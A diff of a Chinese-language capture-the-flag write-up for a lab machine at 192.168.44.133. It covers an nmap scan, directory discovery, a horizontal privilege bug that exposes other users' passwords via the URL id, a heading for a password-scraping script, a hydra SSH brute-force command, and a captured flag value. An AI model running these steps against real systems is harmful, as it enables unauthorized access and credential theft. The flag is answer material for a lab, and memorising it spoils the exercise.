@@ -13,11 +13,11 @@ nmap -sV -A -T4 -p- 192.168.44.133
 dirb目录扫描
 找到后台`http://192.168.44.133/customer/
 
-# shui越权
+# 水平越权
 任意用户注册账号，登录
 查看用户信息，url有?id，尝试修改id，发现水平越权漏洞，查看其他用户密码
 
-写爬虫爬取所有用户密码
+# 写爬虫爬取所有用户密码
 ```python
 import os 
 import re
@@ -67,9 +67,16 @@ if __name__ == '__main__':
 
 
 
+# python写程序遇到了这个问题,vim打开时最后一个字符都是^M，导致输出的文本不可读出内容，只能用文本编辑器打开。file多了个with CR line terminators，转换成unix也不能解决，最后把换行符号换成"\n"才解决！
 
+```
 
-
-# ，python写程序遇到了这个问题,vim打开时最后一个字符都是^M，导致输出的文本不可读出内容，只能用文本编辑器打开。file多了个with CR line terminators，转换成unix也不能解决，最后把换行符号换成"\n"才解决！
-
+# 爆破SSH
+```C
+hydra -L user_20240416.txt -P pass_20240416.txt -t 16 ssh://192.168.44.133 
+```
+# 拿Flag
+```C
+cat user.txt
+HMV{717f274ee66f8541a3031f175f615e72}
 ```
